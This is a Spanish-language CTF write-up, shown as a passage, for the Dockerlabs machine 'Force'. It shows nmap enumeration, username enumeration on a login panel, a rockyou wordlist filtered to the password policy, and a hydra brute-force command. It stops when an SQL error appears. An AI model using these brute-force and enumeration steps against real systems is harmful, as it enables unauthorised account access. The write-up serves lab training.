# ⚙️ CTF

<img width="1152" height="618" alt="image" src="https://github.com/user-attachments/assets/ff7a4014-ff99-476b-932d-8635a55d7e83" />

♟️ Nombre: Force

🐧 SO: Linux

🛜 Dificiltad: DIFICIL

👥 Creador: kvzlx


# 📋 ENUMERACIÓN 

Vamos a empezar lanzando trazas ICMP para ver si tenemos conectividad con la máquina víctima.

<pre>
  <code>
┌──(root㉿kali)-[/home/kali/Dockerlabs]
└─# ping -c2 172.17.0.3
PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.049 ms
64 bytes from 172.17.0.3: icmp_seq=2 ttl=64 time=0.057 ms

--- 172.17.0.3 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1013ms
rtt min/avg/max/mdev = 0.049/0.053/0.057/0.004 ms

  </code>
</pre>
Vemos que efectivamente tenemos conectividad con la máquina víctima basándonos en el ttl de 64 sabemos que estamos ante una máquina con SO Linux, si fuera Windows estaría cerca de 128 o 128 aunque el ttl es manipulable pero normalmente suele ser así.

Vamos a realizar un escaneo de red para enumerar puertos abiertos y servicios que corren.

<pre>
  <code>
┌──(root㉿kali)-[/home/kali/Dockerlabs]
└─# nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.3 -oN info_ports
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-25 12:23 CET
Nmap scan report for 172.17.0.3
Host is up (0.0000070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
  </code>
</pre>

## Parámetros
<pre>
  <code>
-p- : Escaneo de todos los puertos (Los 65535)

--open: Para que muestre únicamente los puertos que esteán abiertos.

-sS: Para hacer el escaneo sigiloso y sobre todo más rápido.

--min-rate 5000: Para indicarle que no vaya más despacio que 5000 paquetes por segundo

-n: Para indicarle que no queremos que haga resolución DNS es decir que no intente convertir direcciones IP en dominios.

-Pn: Para que no realize host discovering ya que suponemos que la máquina está levantada

-oN: guardar el reporte en un archivo

Vemos que tenemos 2 puertos abiertos el 22 donde corre ssh y el 80 donde corre http. Vamos a enumerar versiones y servicios que corren en cada puerto.
</code>
</pre>

<pre>
  <code>
┌──(root㉿kali)-[/home/kali/Dockerlabs]
└─# nmap -p22,80 -sCV 172.17.0.3
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-25 12:24 CET
Nmap scan report for 172.17.0.3
Host is up (0.000046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:a0:22:8d:33:4a:42:3d:4f:e9:3f:50:d1:ca:bc:76 (ECDSA)
|_  256 ae:00:c4:d6:b4:95:8e:ea:0b:8a:f3:d9:9b:c1:81:63 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.97 seconds

  </code>
</pre>

Accediendo desde el navegador podemos comprobar que se trata de un panel de login en el cual primeramente nos salta un popup con algunos parametros que debe tener la contraseña.

- Uppercase letter
- Lowercase letter
- Al menos un digito
- Al menos 10 caracteres

  Si probamos a poner un usuario cualquiera por ejemplo "wvverez" ya nos dice que no existe aunque si probamos con un usuario existente como fue el caso de "admin" nos dice que la contraseña es incorrecta.
  Lo siguiente que haremos será hacer fuerza bruta al panel de login con el usuario admin y con los requisitos que nos piden.

  Pero antes de ello para reducir el trabajo nos haremos un diccionario en el que solo haya palabras con los requisitos que pide el panel de login, para ello:

  <pre>
    <code>
      tr -d '\r' < rockyou.txt | awk 'length($0)>=10 && /[A-Z]/ && /[a-z]/ && /[0-9]/' | sponge new_rockyou.txt
    </code>
  </pre>

  Bien ahora haremos fuerza bruta al panel de login con el nuevo diccionario.

  <pre>
    <code>
┌──(root㉿kali)-[/home/kali/Dockerlabs]
└─# hydra -l admin -P rockyou.txt2 172.17.0.3 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials."
    </code>
  </pre>

De esta forma conseguimos las credenciales para poder loguearnos en el panel de login. Una vez nos logueamos vemos un panel para agregar notas si agregamos una comilla simple vemos que estamos alterando el sistema ya que nos da un error de SQL.

<img width="691" height="457" alt="image" src="https://github.com/user-attachments/assets/50fd4a3d-f518-48c9-8646-69173d3eb30f" />
<img width="1885" height="162" alt="image" src="https://github.com/user-attachments/assets/17a785d0-995b-4bbb-9060-0594b24fddbe" />




